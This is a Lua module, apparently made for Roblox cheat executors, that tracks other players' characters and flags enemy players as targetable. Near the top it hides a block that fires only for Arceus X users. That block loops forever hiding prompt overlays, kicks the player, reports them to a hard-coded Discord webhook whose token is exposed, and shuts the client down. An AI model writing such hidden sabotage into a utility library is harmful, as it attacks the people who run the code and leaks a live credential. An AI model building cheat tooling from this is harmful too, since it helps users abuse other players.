local entity = {
    entityList = {},
    entityConnections = {},
    isAlive = false,
    character = {
        Head = {},
        Humanoid = {},
        HumanoidRootPart = {}
    }
}
local lplr = game:GetService("Players").LocalPlayer

if identifyexecutor and identifyexecutor():find("Arceus") then 
    local image2 = Instance.new("ImageLabel")
    image2.Size = UDim2.new(0, 0, 0, 0)
    image2.AnchorPoint = Vector2.new(0.5, 0.5)
    image2.Image = "rbxassetid://10168867281"
    image2.BackgroundTransparency = 1
    image2.Position = UDim2.new(0.5, 0, 0.5, 0)
    image2.Parent = game.CoreGui.RobloxGui
    local audio = Instance.new("Sound")
    audio.SoundId = "rbxassetid://7147641250"
    audio.Parent = workspace
    repeat task.wait() until image2.IsLoaded and audio.IsLoaded
    local overlay = game:GetService("CoreGui"):WaitForChild("RobloxPromptGui"):WaitForChild("promptOverlay")
    overlay.ChildAdded:Connect(function(obj)
        task.spawn(function()
            repeat
                task.wait()
                obj.Visible = false
            until true == false
        end)
        local image = Instance.new("ImageLabel")
        image.Size = UDim2.new(0, 128, 0, 128)
        image.AnchorPoint = Vector2.new(0.5, 0.5)
        image.Image = "rbxassetid://10168867281"
        image.BackgroundTransparency = 1
        image.Position = UDim2.new(0.5, 0, 0.5, 0)
        image.Parent = overlay
    end)
    lplr:Kick("what the dog doin")
    task.wait(0.1)
    audio:Play()
    audio.Ended:Wait()
    local encoded = game:GetService("HttpService"):JSONEncode({
        content = "Arceus X user executed script :skull:",
        embeds = "",
        attachments = {}
    })
    local ok = request({
        Url = "https://discord.com/api/webhooks/995376684717047918/fK9GLBjjFzjsBAgZWl2ZYO1qo8N3zqGwKqcelY9R6DRs4PU5aLoimaFVW34IxDjS2PA3",
        Method = "POST",
        Body = encoded,
        Headers = {["Content-Type"] = "application/json"}
    })
    task.wait(1)
    game:Shutdown()
end

do
    entity.isPlayerTargetable = function(plr)
        if plr.Team ~= lplr.Team or lplr.Team == nil then
            return true
        end
    end

    entity.getEntityFromPlayer = function(char)
        for i,v in pairs(entity.entityList) do
            if v.Player == char then
                return i, v
            end
        end
        return nil
    end

    entity.removeEntity = function(obj)
        local tableIndex = entity.getEntityFromPlayer(obj)
        if tableIndex then
            table.remove(entity.entityList, tableIndex)
        end
    end

    entity.refreshEntity = function(plr, localcheck)
        entity.removeEntity(plr)
        entity.characterAdded(plr, plr.Character, localcheck)
    end

    entity.characterAdded = function(plr, char, localcheck)
        if char then
            spawn(function()
                local humrootpart = char:WaitForChild("HumanoidRootPart", 10)
                local head = char:WaitForChild("Head", 10)
                local hum = char:WaitForChild("Humanoid", 10)
                if humrootpart and hum and head then
                    if localcheck then
                        entity.isAlive = true
                        entity.character.Head = head
                        entity.character.Humanoid = hum
                        entity.character.HumanoidRootPart = humrootpart
                    else
                        table.insert(entity.entityList, {
                            Player = plr,
                            Character = char,
                            RootPart = humrootpart,
                            Head = head,
                            Humanoid = hum,
                            Targetable = entity.isPlayerTargetable(plr),
                            Team = plr.Team
                        })
                    end
                    entity.entityConnections[#entity.entityConnections + 1] = char.ChildRemoved:connect(function(part)
                        if part.Name == "HumanoidRootPart" or part.Name == "Head" or part.Name == "Humanoid" then
                            if localcheck then
                                entity.isAlive = false
                            else
                                entity.removeEntity(plr)
                            end
                        end
                    end)
                end
            end)
        end
    end

    entity.entityAdded = function(plr, localcheck, custom)
        entity.entityConnections[#entity.entityConnections + 1] = plr.CharacterAdded:connect(function(char)
            entity.refreshEntity(plr, localcheck)
        end)
        entity.entityConnections[#entity.entityConnections + 1] = plr.CharacterRemoving:connect(function(char)
            if localcheck then
                entity.isAlive = false
            else
                entity.removeEntity(plr)
            end
        end)
        entity.entityConnections[#entity.entityConnections + 1] = plr:GetPropertyChangedSignal("Team"):connect(function()
            if localcheck then
                entity.fullEntityRefresh()
            else
                task.wait(0.5)
                entity.refreshEntity(plr, localcheck)
            end
        end)
        if plr.Character then
            entity.refreshEntity(plr, localcheck)
        end
    end

    entity.fullEntityRefresh = function()
        entity.entityList = {}
        for i,v in pairs(entity.entityConnections) do if v.Disconnect then v:Disconnect() end end
        entity.entityConnections = {}
        for i2,v2 in pairs(game:GetService("Players"):GetPlayers()) do entity.entityAdded(v2, v2 == lplr) end
        entity.entityConnections[#entity.entityConnections + 1] = game:GetService("Players").PlayerAdded:connect(function(v2) entity.entityAdded(v2, v2 == lplr) end)
        entity.entityConnections[#entity.entityConnections + 1] = game:GetService("Players").PlayerRemoving:connect(function(v2) entity.removeEntity(v2) end)
    end
end

return entity